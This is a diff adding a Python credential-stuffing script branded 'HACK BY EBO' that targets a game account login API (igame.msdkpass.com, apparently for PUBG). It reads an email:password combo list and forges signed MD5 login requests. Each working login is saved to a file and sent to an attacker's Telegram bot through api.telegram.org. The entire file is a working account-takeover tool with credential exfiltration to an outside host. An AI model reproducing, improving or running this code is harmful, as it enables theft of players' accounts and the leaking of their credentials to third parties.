@@ -1,0 +1,85 @@
+import requests,hashlib,random,string,time
+r = requests.session()
+print("""
+
+
+
+  ______ ____   ____                
+ |  ____|  _ \ / __ \               
+ | |__  | |_) | |  | |              
+ |  __| |  _ <| |  | |              
+ | |____| |_) | |__| |              
+ |______|____/ \____/               
+  / ____|         | |               
+ | |     _ __ __ _| | _____ _ __    
+ | |    | '__/ _` | |/ / _ \ '__|   
+ | |____| | | (_| |   <  __/ |      
+  \_____|_|  \__,_|_|\_\___|_|
+                                    
+                                    
+
+
+        Telegram:@EBO_RUSSY
+       instagram:@vx.EBO
+          TIKTOK:@EBO_RUSSY
+          
+
+  ______ ____   ____                 
+ |  ____|  _ \ / __ \                
+ | |__  | |_) | |  | |               
+ |  __| |  _ <| |  | |               
+ | |____| |_) | |__| |               
+ |______|____/_\____/_ _______     __
+ |  __ \| |  | |/ ____/ ____\ \   / /
+ | |__) | |  | | (___| (___  \ \_/ / 
+ |  _  /| |  | |\___ \\___ \  \   /  
+ | | \ \| |__| |____) |___) |  | |   
+ |_|  \_\\____/|_____/_____/   |_|   
+                                     
+                                     
+
+
+""")
+ID= input('[+] ID telegramy xot  : ')
+token = input('[+] ID botakat  : ')
+headPUB = {
+	"Content-Type": "application/json; charset=utf-8","User-EBO": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.EBO","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
+def CHECK(email,pess):
+  eml = email
+  pas = pess
+  YES = f"""
+[ok] peroza > HACK BY EBO :
+HACK BY EBO
+[ok] Email: {eml}
+[ok] Pass: {pas}
+━━━━━━━━━━━━━"""
+  NO = f"""
+[✗]  bbura sutawa > HACK BY EBO :
+sarkautu nabu EBO
+[✗] Email: {eml}
+[✗] Pass: {pas}
+━━━━━━━━━━━━━"""
+  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
+  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
+  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
+  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
+  time.sleep(0.5)
+  GO=r.get(url, data=daPU,headers=headPUB).text
+  if '"token"' in GO:
+    print(YES)
+    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @EBO_RUSSY& @EBO_RUSSY')
+    with open('NWE-PUBG.txt', 'a') as x:
+      x.write(eml+':'+pas+' |Give Way \n')
+  else:
+    print(NO)
+def FILname():
+  F = input('[+] nawe comboyaka yan cope combo : ')
+  try:
+    for x in open(F,'r').read().splitlines():
+      email = x.split(":")[0]
+      pess = x.split(":")[1]
+      CHECK(email,pess)
+  except FileNotFoundError:
+    print('\n[-] The file name is incorrect !\n')
+    return FILname()
+FILname()
